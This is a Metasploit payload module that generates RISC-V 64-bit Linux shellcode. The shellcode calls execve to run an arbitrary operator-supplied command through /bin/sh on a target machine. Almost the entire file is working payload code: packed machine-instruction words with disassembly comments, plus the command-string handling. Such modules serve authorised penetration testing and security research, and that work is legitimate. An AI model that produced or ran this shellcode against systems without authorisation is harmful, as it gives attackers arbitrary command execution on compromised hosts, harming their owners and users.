##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 100

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Execute Command',
        'Description' => 'Execute an arbitrary command',
        'Author' => [
          'modexp', # cmd.s execve RISC-V 64-bit shellcode
          'bcoles', # metasploit
        ],
        'License' => BSD_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_RISCV64LE,
        'References' => [
          ['URL', 'https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/'],
          ['URL', 'https://github.com/odzhan/shellcode/blob/master/os/linux/riscv64/cmd.s'],
        ]
      )
    )
    register_options([
      OptString.new('CMD', [ true, 'The command string to execute' ]),
    ])
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    datastore['CMD'] || ''
  end

  def generate(_opts = {})
    shellcode =
      [0xfc010113].pack('V*') +  # addi sp,sp,-64
      [0x0dd00893].pack('V*') +  # li a7,221
      [0x34399537].pack('V*') +  # lui a0,0x34399
      [0x7b75051b].pack('V*') +  # addiw a0,a0,1975
      [0x00c51513].pack('V*') +  # slli a0,a0,0xc
      [0x34b50513].pack('V*') +  # addi a0,a0,843 # 3439934b <__global_pointer$+0x343879a3>
      [0x00d51513].pack('V*') +  # slli a0,a0,0xd
      [0x22f50513].pack('V*') +  # addi a0,a0,559
      [0x00a13023].pack('V*') +  # sd a0,0(sp)
      [0x00010513].pack('V*') +  # mv a0,sp
      [0x000065b7].pack('V*') +  # lui a1,0x6
      [0x32d5859b].pack('V*') +  # addiw a1,a1,813
      [0x00b13423].pack('V*') +  # sd a1,8(sp)
      [0x00810593].pack('V*') +  # addi a1,sp,8
      [0x00000617].pack('V*') +  # auipc a2,0x0
      [0x02460613].pack('V*') +  # addi a2,a2,36 # 100d4 <cmd>
      [0x00a13823].pack('V*') +  # sd a0,16(sp)
      [0x00b13c23].pack('V*') +  # sd a1,24(sp)
      [0x02c13023].pack('V*') +  # sd a2,32(sp)
      [0x02013423].pack('V*') +  # sd zero,40(sp)
      [0x01010593].pack('V*') +  # addi a1,sp,16
      [0x00000613].pack('V*') +  # li a2,0
      [0x00000073].pack('V*') +  # ecall
      command_string + "\x00"

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
